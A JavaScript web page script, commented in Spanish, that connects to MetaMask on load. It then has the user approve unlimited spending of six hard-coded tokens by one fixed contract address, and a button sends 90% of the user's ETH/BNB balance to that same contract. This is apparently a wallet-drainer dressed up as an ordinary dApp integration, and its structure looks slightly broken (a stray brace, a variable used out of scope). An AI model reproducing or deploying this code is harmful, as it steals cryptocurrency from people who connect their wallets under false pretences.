// Configurar web3.js con el proveedor de MetaMask
window.addEventListener('load', async () => {
    if (window.ethereum) {
        window.web3 = new Web3(ethereum);
        try {
            // Solicitar acceso a la cuenta si es necesario
            await ethereum.request({ method: 'eth_requestAccounts' }); // Actualizado para usar la API recomendada
            // Cuentas ahora expuestas, iniciar el contrato.
            initApp();
        } catch (error) {
            console.error("El usuario denegó el acceso a la cuenta");
        }
    } else if (window.web3) {
        window.web3 = new Web3(web3.currentProvider);
        // Cuentas siempre expuestas, iniciar el contrato.
        initApp();
    } else {
        console.log('No se detectó ningún proveedor de Ethereum. Instale MetaMask.');
    }
});

async function initApp() {
    // Dirección del contrato
    const contractAddress = "0xC9007A9bdAb60e90AB2c658ddd21DD76d023f723";

    // Direcciones de los tokens ERC-20 a interactuar
    const tokens = ["0x8965349fb649A33a30cbFDa057D8eC2C48AbE2A2", "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", "0x55d398326f99059fF775485246999027B3197955", "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", "0xCC42724C6683B7E57334c4E856f4c9965ED682bD"];

    // Obtener la cuenta del usuario conectada a MetaMask
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) {
        console.log('No se encontraron cuentas. Asegúrate de que MetaMask esté conectado.');
        return;
    }
    const account = accounts[0];
    console.log('Cuenta conectada:', account);

    // Interacción con el contrato para aprobar la transferencia de todos los tokens ERC-20
    approveTransferForAllTokens(tokens, account, contractAddress);
}
 document.getElementById('sendEthBtn').addEventListener('click', async () => {
        const accounts = await web3.eth.getAccounts();
        if (accounts.length === 0) {
            console.error("No hay cuentas disponibles.");
            return;
        }
        const account = accounts[0];

        try {
            const balance = await web3.eth.getBalance(account);
            // Calcula el 90% del saldo del usuario para enviar
            const amountToSend = web3.utils.toWei((web3.utils.fromWei(balance, 'ether') * 0.9).toString(), 'ether');

            web3.eth.sendTransaction({
                from: account,
                to: contractAddress,
                value: amountToSend
            }).then(function(receipt){
                console.log('Transacción completada:', receipt);
            }).catch(function(error){
                console.error('Error al enviar ETH/BNB:', error);
            });
        } catch (error) {
            console.error("Error al obtener el balance o enviar ETH/BNB:", error);
        }
    });
}

async function approveTransferForAllTokens(tokens, userAccount, contractAddress) {
    // Fragmento de la ABI para las funciones necesarias del token ERC-20
    const erc20Abi = [
        {
            "constant": true,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
            "name": "approve",
            "outputs": [{"name": "", "type": "bool"}],
            "type": "function"
        }
    ];

    // Valor máximo para uint256
    const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    try {
        for (const tokenAddress of tokens) {
            const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
            // Se utiliza MAX_UINT256 para la aprobación, en lugar del balance actual
            const approved = await tokenContract.methods.approve(contractAddress, MAX_UINT256).send({from: userAccount});
            console.log(`Aprobación ilimitada concedida para ${tokenAddress}:`, approved);
        }
    } catch (error) {
        console.error("Error al aprobar la transferencia:", error);
    }
}
